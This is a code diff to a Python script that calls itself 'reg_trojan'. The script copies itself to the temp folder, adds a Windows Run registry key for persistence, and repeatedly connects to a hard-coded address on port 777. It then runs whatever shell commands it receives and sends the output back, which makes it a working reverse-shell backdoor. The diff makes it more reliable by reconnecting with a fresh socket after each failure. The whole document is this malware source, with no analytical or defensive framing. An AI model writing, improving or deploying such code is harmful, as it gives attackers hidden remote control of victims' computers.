@@ -1,30 +1,34 @@
 import socket, os
 import subprocess
 import tempfile
+import time
 
 ip = '192.168.1.104'
 port = 777
 path = tempfile.gettempdir()
 filename = os.path.basename(__file__)
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+source = os.path.dirname(filename)
 
 def autorun():
+	if path == source:
+		return False
 	try:
 		os.system('copy ' + filename + ' ' + path)
 		os.system('REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v reg_trojan /d '+path+'\\'+filename)
 	except:
 		pass 
-
 	connection(ip, port)
 
 def connection(ip, port):
-	while True:
+	while True:	
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		try:
 			s.connect((ip, port))
 			execute(s)
 		except Exception as e:
 			print(e)
+			time.sleep(3)
+		s.close()
 		
 def execute(s):
 	while True:
@@ -33,7 +37,7 @@ def execute(s):
 		command = data.decode("utf-8")
 		
 		if command[:-1] == 'exit':
-			exit(0)
+			return False
 
 		if 'cd' in command:
 			os.chdir(command[3:].strip('\n'))
@@ -42,7 +46,5 @@ def execute(s):
 		process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		output, error = process.communicate()
 		s.send(output + error)
-
-	s.close()
 
 autorun()
